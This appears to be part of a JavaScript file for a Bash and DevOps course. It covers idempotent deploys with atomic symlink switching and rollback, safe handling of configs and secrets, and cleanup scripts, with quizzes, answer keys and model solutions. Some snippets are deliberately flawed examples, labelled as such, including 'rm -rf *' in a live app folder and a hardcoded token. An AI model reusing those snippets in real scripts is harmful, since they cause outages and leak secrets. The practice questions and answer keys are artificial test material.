echo "naive.conf has $(wc -l < naive.conf) lines, safe.conf has $(wc -l < safe.conf) line"
# Output:
# naive.conf has 3 lines, safe.conf has 1 line` },
      { title: 'A deploy you can re-run and roll back (self-contained demo)', html: `<p>This demo deploys versions into release folders under a test folder and switches a symlink. Deploying the same version twice does nothing the second time, and old releases are pruned but the current one never is. Run it as <code>BASE=$(mktemp -d) bash demo-deploy.sh v1 v2 v2 v3 v4</code>.</p>`, code: B`#!/usr/bin/env bash
# demo-deploy.sh VERSION...: release folders + atomic symlink switch, safe to re-run
set -euo pipefail
BASE="\${BASE:?set BASE to a test folder}"
KEEP=3
deploy() {
  local version="$1" rel="$BASE/releases/$1" tmp old
  [[ $version =~ ^v[0-9]+$ ]] || { echo "bad version: $version" >&2; return 2; }
  mkdir -p "$BASE/releases"
  if [[ $(readlink "$BASE/current" 2>/dev/null) == "$rel" ]]; then
    echo "$version: already current, nothing to do"; return 0
  fi
  if [[ ! -d $rel ]]; then
    tmp="$(mktemp -d "$BASE/releases/.tmp.XXXXXX")"
    echo "app $version" > "$tmp/VERSION"           # real life: unpack the build artifact here
    mv -T -- "$tmp" "$rel"                          # appears all at once, or not at all
  fi
  ln -sfn -- "$rel" "$BASE/current.new"             # new link beside the old one
  mv -T -- "$BASE/current.new" "$BASE/current"      # rename over it: atomic switch
  echo "$version: now current"
  # prune: newest first by modification time, keep $KEEP, never delete the current release
  mapfile -t olds < <(find "$BASE/releases" -mindepth 1 -maxdepth 1 -type d -name 'v*' -printf '%T@ %f\n' |
                      sort -rn | cut -d' ' -f2- | tail -n +$(( KEEP + 1 )))
  for old in "\${olds[@]}"; do
    [[ $BASE/releases/$old == "$rel" ]] && continue
    rm -rf -- "$BASE/releases/\${old:?}"
    echo "  pruned $old"
  done
}
for v in "$@"; do deploy "$v"; sleep 0.01; done
echo "current -> $(readlink "$BASE/current" | sed "s#$BASE/##")"
# Output of: BASE=$(mktemp -d) bash demo-deploy.sh v1 v2 v2 v3 v4
# v1: now current
# v2: now current
# v2: already current, nothing to do
# v3: now current
# v4: now current
#   pruned v1
# current -> releases/v4` },
      { title: 'Reload nginx only if the config really changed', html: `<p>A config-push script reloaded nginx on every run, every 5 minutes, across 40 servers, and once pushed a broken file that took all of them down at once. The safe version renders to a temp file, does nothing if it is identical, validates with <code>nginx -t</code> against the new file before replacing, and keeps a backup for a quick manual rollback.</p>`, code: B`#!/usr/bin/env bash
set -euo pipefail
src="\${1:?usage: push-nginx.sh NEW_CONF}"
dest=/etc/nginx/conf.d/app.conf

if [[ -f $dest ]] && cmp -s -- "$src" "$dest"; then
  echo "no change, nothing to do"; exit 0
fi

# Validate the candidate in place, but keep the old file to restore on failure
[[ -f $dest ]] && cp -p -- "$dest" "$dest.bak"
install -m 0644 -- "$src" "$dest"
if ! nginx -t 2>&1; then
  echo "new config is invalid, restoring the previous one" >&2
  if [[ -f $dest.bak ]]; then mv -f -- "$dest.bak" "$dest"; else rm -f -- "$dest"; fi
  exit 1
fi
systemctl reload nginx
echo "config updated and nginx reloaded"` },
      { title: 'Dry-run and confirmation for destructive scripts', html: `<p>A cleanup tool for old EBS snapshots or temp buckets should show what it will do first. The pattern: build the list, print it, then act only if <code>--yes</code> was given or a human typed "yes" at a terminal. <code>[[ -t 0 ]]</code> is true only when stdin is a terminal, so in cron or CI the script never waits for an answer that cannot come.</p>`, code: B`#!/usr/bin/env bash
set -euo pipefail
yes=0; [[ \${1:-} == --yes ]] && yes=1

cd "$(mktemp -d)" && touch old-1.tmp old-2.tmp keep.txt      # demo data
mapfile -t victims < <(find . -maxdepth 1 -name '*.tmp' -printf '%f\n' | sort)

echo "will delete \${#victims[@]} file(s):"; printf '  %s\n' "\${victims[@]}"
if (( ! yes )); then
  if [[ -t 0 ]]; then
    read -r -p "type yes to continue: " answer
    [[ $answer == yes ]] || { echo "aborted"; exit 1; }
  else
    echo "not a terminal and no --yes given: dry run only"; exit 0
  fi
fi
rm -f -- "\${victims[@]}"
echo "deleted. left: $(ls)"
# Output of: bash cleanup.sh < /dev/null
# will delete 2 file(s):
#   old-1.tmp
#   old-2.tmp
# not a terminal and no --yes given: dry run only` }
    ],
    deepDive: `<p>🟣 <b>Why <code>ln -sfn</code> alone is not atomic.</b> <code>ln -sf</code> removes the old link and then creates the new one: for a moment, <code>current</code> does not exist, and a request in that gap gets a 404. Creating the new link under a temporary name and then <code>mv -T</code> (rename) over the old one uses the <code>rename()</code> system call, which replaces the name in a single step. The same trick (write <code>file.tmp</code>, then rename) gives atomic config and state files. It only works within one filesystem; across filesystems <code>mv</code> silently becomes copy + delete.</p>
      <p><b>Check-then-act races.</b> "If the user does not exist, create it" is safe for one script, but two copies running together can both see "does not exist". Locks (<code>flock</code>) remove the race for scripts on one host. Across hosts you need a shared lock (a DynamoDB or database row, a Consul lock, or simply letting the CI system serialize deploys per environment).</p>
      <p><b>Partial failure and resumability.</b> A script with 10 steps that dies at step 6 should be safe to start again from step 1. That means every step is "ensure" style, or the script records completed steps in a state file. When a script needs a state file, many resources and many hosts, it has become a configuration-management tool, and you should consider Ansible (idempotent modules, <code>--check</code> mode), Terraform (plan/apply on cloud resources) or a proper deploy tool.</p>
      <p><b>Testing scripts.</b> ShellCheck catches quoting and many logic bugs statically. <b>bats-core</b> runs real tests (<code>@test "second run changes nothing" { run ./ensure.sh; run ./ensure.sh; [ "$output" = "state is correct" ]; }</code>). Containers make it cheap: run the script twice in <code>docker run --rm ubuntu:24.04</code> and compare. "Run it twice" is the simplest idempotence test there is, and it belongs in CI.</p>
      <p><b>Least privilege and safe defaults.</b> Scripts should run as a dedicated user and use <code>sudo</code> only for the commands that need it (with a narrow sudoers rule, see Cloud &amp; DevOps 1). Default to the safe behaviour (dry-run, refuse on unknown input, refuse <code>/</code> as a target), and make the dangerous behaviour an explicit flag. Keep secrets out of arguments (visible in <code>ps</code>) and out of logs.</p>`,
    aiEra: `<p>🤖 <b>What AI changes:</b> assistants and agents now run scripts for you, sometimes repeatedly while "trying to fix" something. That makes idempotence more important than ever: an agent that re-runs a non-idempotent setup script five times leaves five cron entries and five config lines. Asking an assistant "make this script idempotent and add a dry-run flag" is a good first pass, and it is good at spotting appends without checks.</p>
      <p><b>Where it goes wrong:</b> generated deploy scripts often <code>rm -rf</code> the old release before the new one is ready (downtime and no rollback), restart services unconditionally, and use <code>ln -sf</code> as if it were atomic. Agents may also add <code>--force</code> or <code>|| true</code> to get past an error rather than understanding it. <b>Your job:</b> test every automation script with "run it twice" and "kill it halfway, then run it again"; give agents a sandbox and a dry-run mode; and require a human approval step for destructive actions in production.</p>`,
    problems: [P({
      t: 'Make the deploy script safe to re-run', l: 'Hard', tags: ['idempotency', 'deploy', 'symlink', 'rollback', 'flock'], co: ['Netflix', 'Atlassian'],
      s: `<p>The current deploy script for a small web app runs on the server from CI:</p>
<pre>cd /srv/app
rm -rf *
tar xzf /tmp/app-$1.tgz
echo "0 3 * * * /srv/app/bin/cleanup" &gt;&gt; /etc/cron.d/app
systemctl restart app</pre>
<p>Last week CI timed out during the restart and retried: the site was down while the files were deleted and re-extracted, and <code>/etc/cron.d/app</code> now has three identical lines. Rewrite it as <code>deploy.sh VERSION</code> that is <b>safe to re-run</b>, never shows users a half-deployed app, checks the artifact, rolls back automatically if the new version is unhealthy, keeps the last 5 releases, and cannot run twice at the same time.</p>`,
      constraints: LAB + ' Simulate the service with a tiny HTTP server or stub out <code>systemctl</code> in a test; the artifact is <code>/tmp/app-VERSION.tgz</code> with a <code>.sha256</code> file next to it.',
      ex: `<p><code>deploy.sh 1.4.2</code> (first time): verifies the checksum, unpacks into <code>releases/1.4.2</code>, switches <code>current</code>, restarts, the health check passes: ${H.c('g', 'deployed 1.4.2')}. Same command again: ${H.c('g', '1.4.2 is already live, nothing to do')}, exit 0, no restart. <code>deploy.sh 1.5.0</code> with a broken build: health check fails, ${H.c('r', 'rolling back to 1.4.2')}, exit 1, and the site keeps serving 1.4.2.</p>`,
      bw: `<p>The original destroys the running version <b>before</b> the new one exists (downtime, and no way back), extracts straight into the live folder (users see a mix of old and new files), appends the cron line every run, restarts unconditionally, never checks that the tarball is complete, and has no lock, so two CI retries can interleave.</p>`,
      bc: B`cd /srv/app
rm -rf *                                    # site is down from here...
tar xzf /tmp/app-$1.tgz                     # ...until this finishes (if it does)
echo "0 3 * * * /srv/app/bin/cleanup" >> /etc/cron.d/app   # one more line per run
systemctl restart app                       # even if nothing changed`,
      q: ['Which design lets you switch versions with no window where the app folder is incomplete?', ['Unpack each version into its own releases/VERSION folder, then atomically repoint a current symlink', 'Delete the old files faster with rm -rf before extracting', 'Extract over the old files without deleting them', 'Stop the service, extract, start it again'], 0, 'With release folders, the new version is fully on disk before anything points at it, and rename() switches the link in one step. Rollback is the same operation in reverse. The other options all serve a partial or mixed tree for some time.'],
      h: ['<p>Hint 1: layout <code>/srv/app/releases/VERSION</code> and <code>/srv/app/current → releases/VERSION</code>. First check: if <code>current</code> already points at VERSION, exit 0.</p>', '<p>Hint 2: verify <code>sha256sum -c</code>, extract into <code>mktemp -d</code> inside <code>releases/</code>, then <code>mv -T</code> into place. Switch with <code>ln -sfn ... current.new &amp;&amp; mv -T current.new current</code>. Write the cron file whole (it is ours), and compare before replacing it.</p>', '<p>Hint 3: remember the previous target before switching. After restart, poll the health URL with a deadline. On failure, switch back to the previous release, restart, and exit 1. Prune the oldest releases beyond 5, never the current or previous one. Wrap everything in <code>flock -n</code>.</p>'],
      a: `<p>The script validates the version string and takes a lock first. If <code>current</code> already points at the requested release, it exits 0: that alone makes CI retries harmless. Otherwise it verifies the artifact's checksum, unpacks it into a temp folder inside <code>releases/</code> and renames it into place, so a release folder is either complete or absent. It records the previous target, switches the symlink atomically, restarts the service and polls the health endpoint against a deadline. If health fails, it repoints the link to the previous release, restarts, and exits 1, so users keep the old version. The cron file is <b>owned</b> by the deploy: written whole, compared with <code>cmp -s</code>, and replaced only when different. Finally it prunes releases beyond the newest 5, skipping the current and previous ones. Every step either checks first or is safe to repeat, so a run killed at any point can simply be run again.</p>`,
      code: B`#!/usr/bin/env bash
# deploy.sh VERSION - idempotent release deploy with atomic switch and automatic rollback
set -Eeuo pipefail

APP_ROOT="\${APP_ROOT:-/srv/app}"
SERVICE="\${SERVICE:-app}"
HEALTH_URL="\${HEALTH_URL:-http://127.0.0.1:8080/health}"
KEEP=5

log() { printf '%s deploy: %s\n' "$(date -u +%FT%TZ)" "$*" >&2; }
trap 'log "ERROR line $LINENO: $BASH_COMMAND (exit $?)"' ERR

version="\${1:?usage: deploy.sh VERSION}"
[[ $version =~ ^[0-9]+\.[0-9]+\.[0-9]+$ ]] || { log "bad version: $version"; exit 2; }
artifact="/tmp/app-$version.tgz"
releases="$APP_ROOT/releases"
target="$releases/$version"
mkdir -p "$releases"

exec 9> "$APP_ROOT/.deploy.lock"
flock -n 9 || { log "another deploy is running"; exit 1; }

previous="$(readlink "$APP_ROOT/current" 2>/dev/null || true)"
if [[ $previous == "$target" ]]; then
  log "$version is already live, nothing to do"
  exit 0
fi

switch_to() {                                   # switch_to RELEASE_DIR (atomic)
  ln -sfn -- "$1" "$APP_ROOT/current.new"
  mv -T -- "$APP_ROOT/current.new" "$APP_ROOT/current"
}

healthy() {                                     # healthy SECONDS -> 0 when the URL answers 2xx
  local deadline=$(( SECONDS + $1 ))
  until curl -fsS --max-time 3 -o /dev/null "$HEALTH_URL"; do
    (( SECONDS < deadline )) || return 1
    sleep 2
  done
}

# 1. Unpack the release once; an existing complete folder is reused (that is also a rollback path)
if [[ ! -d $target ]]; then
  ( cd "$(dirname "$artifact")" && sha256sum -c --quiet "$artifact.sha256" )
  tmp="$(mktemp -d "$releases/.tmp.XXXXXX")"
  trap 'rm -rf -- "\${tmp:-}"' EXIT
  tar -xzf "$artifact" -C "$tmp"
  mv -T -- "$tmp" "$target"
  log "unpacked $version"
fi

# 2. Switch, restart, verify; roll back on failure
switch_to "$target"
log "switched current -> $version"
systemctl restart "$SERVICE"
if ! healthy 60; then
  log "$version is unhealthy"
  if [[ -n $previous && -d $previous ]]; then
    log "rolling back to \${previous##*/}"
    switch_to "$previous"
    systemctl restart "$SERVICE"
  fi
  exit 1
fi

# 3. Our cron file: written whole, replaced only if different (never appended)
cron_new="$(mktemp)"
printf '%s\n' "0 3 * * * app $APP_ROOT/current/bin/cleanup" > "$cron_new"
if ! cmp -s -- "$cron_new" /etc/cron.d/app; then
  install -m 0644 -- "$cron_new" /etc/cron.d/app
  log "updated /etc/cron.d/app"
fi
rm -f -- "$cron_new"

# 4. Prune old releases: keep the newest $KEEP, never current or previous
mapfile -t old < <(find "$releases" -mindepth 1 -maxdepth 1 -type d -not -name '.*' -printf '%T@ %p\n' |
                   sort -rn | cut -d' ' -f2- | tail -n +$(( KEEP + 1 )))
for d in "\${old[@]}"; do
  [[ $d == "$target" || $d == "$previous" ]] && continue
  rm -rf -- "\${d:?}"
  log "pruned \${d##*/}"
done
log "deployed $version"`,
      cx: `<p>A re-run of a live version costs one <code>readlink</code>. A real deploy costs one checksum, one extract and one restart, plus up to 60 s of health checks. Downtime is just the restart itself; the file switch is instant.</p>`,
      f: ['How would you do a zero-downtime switch for an app that cannot restart without dropping connections (hint: two instances behind a load balancer)?', 'What changes if the same script must deploy to 20 servers, and at what point would you move to Ansible or a CI deploy tool?']
    })]
  });

  // ───────────────────────── Practice: Easy ─────────────────────────
  practice.push(P({
    t: 'Disk usage alert for every real filesystem', l: 'Easy', tags: ['df', 'loops', 'exit codes'], co: ['AWS Support', 'Rackspace'],
    s: `<p>Write <code>disk-alert.sh [THRESHOLD]</code> (default 85) that checks every <b>real</b> filesystem on the server (skip tmpfs, devtmpfs, squashfs, overlay), prints one line per filesystem above the threshold, and exits 1 if any is above it, else prints <code>all filesystems below N%</code> and exits 0. It will run from monitoring every 5 minutes.</p>`,
    ex: `<p>With <code>/</code> at 91% and <code>/data</code> at 40%: ${H.c('r', 'ALERT / is 91% full (threshold 85%)')}, exit 1. With everything below: ${H.c('g', 'all filesystems below 85%')}, exit 0. <code>disk-alert.sh abc</code>: usage error, exit 2.</p>`,
    bw: `<p><code>df -h | grep -v Use | awk '{print $5}'</code> and eyeballing it. Human-readable sizes and wrapped lines (long device names) break parsing, pseudo-filesystems like squashfs snaps always show 100% and cause false alerts, and nothing sets an exit code for the monitor.</p>`,
    bc: B`df -h | awk '{print $5, $6}'     # includes header, snaps at 100%, long names may wrap`,
    q: ['Why use <code>df --output=pcent,target</code> (or <code>df -P</code>) in scripts instead of <code>df -h</code>?', ['It gives a stable one-line-per-filesystem format that is safe to parse', 'It is faster', 'It includes inode counts', 'It hides the root filesystem'], 0, 'Both forms never wrap long device names onto a second line, so each filesystem is exactly one line, and --output also lets you pick the columns (GNU df does not allow -P and --output together). Human-readable sizes are for people, not scripts.'],
    h: ['<p>Hint 1: <code>df --output=pcent,target -x tmpfs -x devtmpfs -x squashfs -x overlay</code> prints only the columns you need, one line per filesystem.</p>', '<p>Hint 2: skip the header with <code>tail -n +2</code>, read each line with <code>while read -r pct mount</code>, strip the <code>%</code> with <code>&#36;{pct%\\%}</code>.</p>', '<p>Hint 3: validate THRESHOLD with a regex. Capture the df output in a variable first and feed the loop with <code>&lt;&lt;&lt; "$report"</code>: the counter survives the loop (no pipe subshell), and a failing df stops the script, which a process substitution would silently hide.</p>'],
    a: `<p>Validate the threshold (1-99). Capture <code>df</code>'s percentage and mount columns in a variable, so a df failure stops the script, then feed the loop with a here-string, so the loop runs in the main shell and the alert counter survives. (A first version of this script used <code>&lt; &lt;(df -P --output ...)</code>: df rejected the option combination, but bash ignores the exit status of a process substitution, so the script happily reported "all filesystems below 85%". Test the failure path.) Skip pseudo-filesystems with <code>-x</code>. Compare numbers with <code>(( ))</code>. Exit 1 if any alert fired, 0 otherwise, 2 for bad usage: monitoring tools only need the code, people get the message.</p>`,
    code: B`#!/usr/bin/env bash
# disk-alert.sh [THRESHOLD]  -> exit 0 ok, 1 alert, 2 usage
set -euo pipefail
threshold="\${1:-85}"
[[ $threshold =~ ^[0-9]+$ ]] && (( threshold >= 1 && threshold <= 99 )) ||
  { echo "usage: \${0##*/} [THRESHOLD 1-99]" >&2; exit 2; }

# Capture first: a failing df then stops the script (set -e + pipefail).
# A process substitution's exit code would be ignored silently.
report="$(df --output=pcent,target -x tmpfs -x devtmpfs -x squashfs -x overlay | tail -n +2)"

alerts=0
while read -r pct mount; do
  used="\${pct%\%}"
  if (( used >= threshold )); then
    echo "ALERT $mount is \${used}% full (threshold \${threshold}%)"
    alerts=$(( alerts + 1 ))
  fi
done <<< "$report"

if (( alerts > 0 )); then exit 1; fi
echo "all filesystems below \${threshold}%"`,
    cx: `<p>One <code>df</code> call: instant. Safe to run every minute.</p>`,
    f: ['How would you also alert on inode usage?', 'How do you avoid getting the same alert every 5 minutes for hours?']
  }));
  practice.push(P({
    t: 'Read required settings from the environment without leaking secrets', l: 'Easy', tags: ['variables', 'environment', 'secrets'], co: ['HashiCorp', 'Microsoft'],
    s: `<p>A job script needs <code>APP_ENV</code> (staging or prod), <code>DB_HOST</code> and <code>API_TOKEN</code>, and optionally <code>LOG_LEVEL</code> (default <code>info</code>). Write the start of the script: check <b>all</b> required variables at once and list every missing one in a single error (not one per run), validate <code>APP_ENV</code>, then print a config summary that shows the token only as "set (N chars)". The token must never be printed, logged or passed on a command line.</p>`,
    ex: `<p><code>APP_ENV=prod bash job.sh</code> → ${H.c('r', 'missing required settings: DB_HOST API_TOKEN')}, exit 2. <code>APP_ENV=prod DB_HOST=db.internal API_TOKEN=dummy-value bash job.sh</code> → ${H.c('g', 'env=prod db=db.internal log_level=info token=set (11 chars)')}.</p>`,
    bw: `<p>Hardcoding <code>API_TOKEN="abc123"</code> in the script puts the secret in Git forever. Using <code>&#36;{API_TOKEN:?}</code> on each variable is better, but reports only the first missing one, so the operator fixes them one run at a time. Echoing the whole config "for debugging" prints the token into the logs.</p>`,
    bc: B`API_TOKEN="abc123"                  # secret now lives in Git history
echo "config: $APP_ENV $DB_HOST $API_TOKEN"   # and in every log`,
    q: ['How can a script check that a variable is set without printing its value?', ['<code>[[ -n &#36;{API_TOKEN:-} ]]</code> and print only <code>&#36;{#API_TOKEN}</code> (its length)', '<code>echo $API_TOKEN | wc -c</code>', '<code>set -x</code> and read the trace', '<code>env | grep TOKEN</code>'], 0, 'The test and the length expansion run inside bash and never output the value. The echo pipe works but needlessly handles the value; set -x and env | grep print it in full.'],
    h: ['<p>Hint 1: loop over the names: <code>for name in APP_ENV DB_HOST API_TOKEN</code>, and read each one indirectly with <code>&#36;{!name:-}</code>.</p>', '<p>Hint 2: collect missing names in an array; after the loop, if the array is not empty, print them all and exit 2.</p>', '<p>Hint 3: validate APP_ENV with <code>case</code>. For the summary use <code>&#36;{#API_TOKEN}</code>. Pass the token to tools via stdin or a file with mode 600, never as an argument.</p>'],
    a: `<p>Loop over the required names and use indirect expansion <code>&#36;{!name:-}</code> to read each one, which also works under <code>set -u</code>. Collect all missing names, then fail once with the full list. Apply defaults with <code>:-</code>. Validate the environment against an allow-list. The summary prints the token's length only. Secrets enter through the environment (from a CI secret store or a secrets manager), and the script never echoes them or uses <code>set -x</code>.</p>`,
    code: B`#!/usr/bin/env bash
# job.sh - start of a job that reads config from the environment
set -euo pipefail

required=(APP_ENV DB_HOST API_TOKEN)
missing=()
for name in "\${required[@]}"; do
  [[ -n \${!name:-} ]] || missing+=("$name")      # \${!name} = value of the variable named by $name
done
if (( \${#missing[@]} > 0 )); then
  echo "missing required settings: \${missing[*]}" >&2
  exit 2
fi

LOG_LEVEL="\${LOG_LEVEL:-info}"
case "$APP_ENV" in
  staging|prod) ;;
  *) echo "APP_ENV must be staging or prod (got '$APP_ENV')" >&2; exit 2 ;;
esac

echo "env=$APP_ENV db=$DB_HOST log_level=$LOG_LEVEL token=set (\${#API_TOKEN} chars)"
# Output with APP_ENV=prod DB_HOST=db.internal API_TOKEN=dummy-value:
# env=prod db=db.internal log_level=info token=set (11 chars)`,
    cx: `<p>Constant time. The value of this pattern is operational: one clear error listing everything missing.</p>`,
    f: ['Where should API_TOKEN come from on a cloud VM, a CI runner and a Kubernetes pod?', 'Why is passing the token as <code>--token "$API_TOKEN"</code> to a CLI risky?']
  }));
  practice.push(P({
    t: 'Rename files with spaces in their names, safely', l: 'Easy', tags: ['quoting', 'globs', 'loops', 'parameter expansion'], co: ['Canonical', 'Red Hat'],
    s: `<p>An export job wrote files named like <code>report 2026-03-01.log.txt</code> into a folder. Write <code>fix-ext.sh DIR</code> that renames every <code>*.log.txt</code> to <code>*.log</code> in that folder, works with spaces and odd characters, never overwrites an existing file (report and skip), prints what it did, and supports <code>DRY_RUN=1</code>.</p>`,
    ex: `<p>Folder has <code>report 2026-03-01.log.txt</code>, <code>b.log.txt</code> and an existing <code>b.log</code>: output ${H.c('g', 'renamed: report 2026-03-01.log.txt -> report 2026-03-01.log')} and ${H.c('y', 'skip: b.log already exists')}. Empty folder: ${H.c('g', 'nothing to rename')}.</p>`,
    bw: `<p><code>for f in $(ls *.log.txt); do mv $f $(echo $f | sed s/.txt//); done</code>: names with spaces split into pieces, <code>mv</code> may silently overwrite <code>b.log</code>, and if nothing matches, the loop runs once with the literal pattern.</p>`,
    bc: B`for f in $(ls *.log.txt); do mv $f $(echo $f | sed s/.txt//); done`,
    q: ['What makes <code>for f in "$dir"/*.log.txt</code> run zero times when nothing matches?', ['<code>shopt -s nullglob</code>', '<code>set -u</code>', 'Quoting the glob', '<code>IFS=</code>'], 0, 'By default an unmatched glob stays as literal text. nullglob turns it into an empty list. Quoting the * would stop globbing altogether.'],
    h: ['<p>Hint 1: loop with a glob, never <code>ls</code>: <code>for f in "$dir"/*.log.txt</code>, with <code>shopt -s nullglob</code>.</p>', '<p>Hint 2: the new name is <code>&#36;{f%.txt}</code>. Check <code>[[ -e $new ]]</code> before moving.</p>', '<p>Hint 3: use <code>mv -n --</code> (no-clobber, end of options) as a second safety net, and print only the base names with <code>&#36;{f##*/}</code>.</p>'],
    a: `<p>Enable <code>nullglob</code>, loop over the glob with every variable quoted, compute the target with suffix removal, skip existing targets, and use <code>mv -n --</code> so nothing is overwritten even in a race. A counter reports "nothing to rename" when the folder has no matches. <code>DRY_RUN=1</code> prints the plan only.</p>`,
    code: B`#!/usr/bin/env bash
# fix-ext.sh DIR - rename *.log.txt to *.log, never overwriting
set -euo pipefail
shopt -s nullglob
dir="\${1:?usage: fix-ext.sh DIR}"
[[ -d $dir ]] || { echo "not a directory: $dir" >&2; exit 2; }
dry="\${DRY_RUN:-0}"

count=0
for f in "$dir"/*.log.txt; do
  new="\${f%.txt}"
  if [[ -e $new ]]; then
    echo "skip: \${new##*/} already exists"
    continue
  fi
  if [[ $dry == 1 ]]; then
    echo "would rename: \${f##*/} -> \${new##*/}"
  else
    mv -n -- "$f" "$new"
    echo "renamed: \${f##*/} -> \${new##*/}"
  fi
  count=$(( count + 1 ))
done
(( count > 0 )) || echo "nothing to rename"`,
    cx: `<p>One pass over the matching files, O(n) renames. Renames within a folder are instant.</p>`,
    f: ['How would you do the same recursively in subfolders?', 'What would you add to undo the rename if it turns out to be wrong?']
  }));
  practice.push(P({
    t: 'Check that a list of services is running', l: 'Easy', tags: ['systemctl', 'arrays', 'exit codes'], co: ['DigitalOcean', 'IBM'],
    s: `<p>After patching, an engineer wants one command that confirms the key services are up. Write <code>check-services.sh [SERVICE...]</code> (default list: <code>ssh cron nginx</code>) that prints a status line per service and exits with 0 if all are active, otherwise 1, with a final summary such as <code>2/3 active</code>. It needs systemd, so try it on a VM or WSL with systemd enabled.</p>`,
    ex: `<p>Output on a box where nginx is stopped: ${H.c('g', 'OK    ssh')}, ${H.c('g', 'OK    cron')}, ${H.c('r', 'FAIL  nginx (inactive)')}, then ${H.c('r', '2/3 active')}, exit 1.</p>`,
    bw: `<p>Running <code>systemctl status</code> for each service by hand and reading the screen. It is slow, easy to miss a red line, and the result cannot be used by an automated patch pipeline.</p>`,
    q: ['Which command gives a script a clean yes/no answer for one service?', ['<code>systemctl is-active --quiet NAME</code>', '<code>systemctl status NAME | grep running</code>', '<code>ps aux | grep NAME</code>', '<code>service NAME</code>'], 0, 'is-active returns exit 0 for active and non-zero otherwise, with --quiet suppressing output. grepping status text or ps output is fragile (grep matches itself, wording changes).'],
    h: ['<p>Hint 1: default list with <code>(( $# )) || set -- ssh cron nginx</code>, which replaces "$@" when no arguments are given.</p>', '<p>Hint 2: <code>systemctl is-active NAME</code> prints the state (active, inactive, failed) and sets the exit code.</p>', '<p>Hint 3: under <code>set -e</code>, capture it with <code>state="$(systemctl is-active "$s" || true)"</code> so a stopped service does not end the script.</p>'],
    a: `<p>Use the arguments or a default list via <code>set --</code>. For each service, capture <code>systemctl is-active</code>'s word (its non-zero exit is expected, so <code>|| true</code> with a comment) and print OK or FAIL with the state. Count the active ones, print the summary, and exit 1 if any is not active, so a patch pipeline can stop.</p>`,
    code: B`#!/usr/bin/env bash
# check-services.sh [SERVICE...]  -> exit 0 if all active, 1 otherwise
set -euo pipefail
(( $# > 0 )) || set -- ssh cron nginx

ok=0
for s in "$@"; do
  state="$(systemctl is-active "$s" 2>/dev/null || true)"   # non-zero for inactive: expected here
  if [[ $state == active ]]; then
    printf 'OK    %s\n' "$s"
    ok=$(( ok + 1 ))
  else
    printf 'FAIL  %s (%s)\n' "$s" "\${state:-unknown}"
  fi
done
echo "$ok/$# active"
(( ok == $# ))`,
    cx: `<p>One systemctl call per service: a fraction of a second.</p>`,
    f: ['How would you also check that nginx answers on port 80, not just that it is active?', 'How would you run this on 30 servers and collect the results?']
  }));

  // ───────────────────────── Practice: Medium ─────────────────────────
  practice.push(P({
    t: 'Clean up old temp files with a dry-run and a report', l: 'Medium', tags: ['find', 'safety', 'dry-run'], co: ['Atlassian', 'Shopify'],
    s: `<p>A worker leaves files in <code>/var/tmp/app</code>, and the disk fills every few weeks. Write <code>clean-tmp.sh [-n] [-d DAYS] DIR</code> that deletes regular files older than DAYS (default 7) in DIR and below, never follows symlinks out of DIR, refuses dangerous targets (<code>/</code>, empty, not a folder), prints how many files and how much space were (or would be, with <code>-n</code>) freed, and removes empty subfolders afterwards.</p>`,
    ex: `<p><code>clean-tmp.sh -n -d 7 /var/tmp/app</code> → ${H.c('y', 'dry run: would delete 1532 files, 4.1G')}. Without <code>-n</code>: ${H.c('g', 'deleted 1532 files, 4.1G')}. <code>clean-tmp.sh /</code> → ${H.c('r', 'refusing to clean /')}, exit 2.</p>`,
    bw: `<p><code>rm -rf /var/tmp/app/*</code> from cron deletes files the worker is using right now, does not reach hidden files, and with a typo in the path deletes something else. <code>find $DIR -mtime +7 | xargs rm</code> breaks on spaces and, with an empty DIR, searches the current folder.</p>`,
    bc: B`find $DIR -mtime +7 | xargs rm      # spaces break it; empty DIR -> current folder`,
    q: ['Why use <code>-print0</code> and <code>xargs -0</code> (or <code>-delete</code>) with find?', ['File names can contain spaces and even newlines; NUL is the only byte they cannot contain', 'It is faster', 'It skips hidden files', 'It follows symlinks'], 0, 'Separating names with the NUL byte is the only fully safe way to pass arbitrary file names between programs.'],
    h: ['<p>Hint 1: <code>find "$dir" -xdev -type f -mtime +"$days"</code>. <code>-type f</code> does not match symlinks, and find does not follow them by default (<code>-P</code>).</p>', '<p>Hint 2: get the total size first with <code>-printf \'%s\\n\'</code> summed by awk, and format it with <code>numfmt --to=iec</code>.</p>', '<p>Hint 3: delete with <code>-delete</code>, then remove empty folders with <code>find "$dir" -mindepth 1 -type d -empty -delete</code>.</p>'],
    a: `<p>Parse <code>-n</code> and <code>-d</code> with getopts, validate DAYS, resolve DIR with <code>realpath</code> and refuse <code>/</code> or non-directories. Measure first (count and bytes with one <code>find -printf</code> piped to awk) so the report is accurate in both modes. In real mode, use find's own <code>-delete</code>, which handles any file name and never follows symlinks, then delete empty subfolders (but not DIR itself, thanks to <code>-mindepth 1</code>). <code>-xdev</code> keeps it on one filesystem.</p>`,
    code: B`#!/usr/bin/env bash
# clean-tmp.sh [-n] [-d DAYS] DIR
set -euo pipefail
dry=0 days=7
while getopts ':nd:' opt; do
  case "$opt" in
    n) dry=1 ;;
    d) days="$OPTARG" ;;
    *) echo "usage: clean-tmp.sh [-n] [-d DAYS] DIR" >&2; exit 2 ;;
  esac
done
shift $(( OPTIND - 1 ))
[[ $days =~ ^[0-9]+$ ]] || { echo "DAYS must be a whole number" >&2; exit 2; }
dir="$(realpath -e -- "\${1:?usage: clean-tmp.sh [-n] [-d DAYS] DIR}")"
[[ -d $dir && $dir != / ]] || { echo "refusing to clean $dir" >&2; exit 2; }

read -r count bytes < <(
  find "$dir" -xdev -type f -mtime +"$days" -printf '%s\n' |
  awk '{ n++; s += $1 } END { printf "%d %d\n", n, s }'
)
human="$(numfmt --to=iec "$bytes")"

if (( dry )); then
  echo "dry run: would delete $count files, $human in $dir"
  exit 0
fi
find "$dir" -xdev -type f -mtime +"$days" -delete
find "$dir" -xdev -mindepth 1 -type d -empty -delete
echo "deleted $count files, $human in $dir"`,
    cx: `<p>Two passes over the tree (measure, delete): O(number of files). On millions of files, run it with <code>ionice -c3 nice</code>.</p>`,
    f: ['How do you avoid deleting a file that is old but still open by the worker?', 'Why is <code>-mtime +7</code> "more than 7 full days" and not "7 days or more"?']
  }));
  practice.push(P({
    t: 'Parse a key=value config file without source', l: 'Medium', tags: ['read', 'IFS', 'associative arrays', 'security'], co: ['HashiCorp', 'GitLab'],
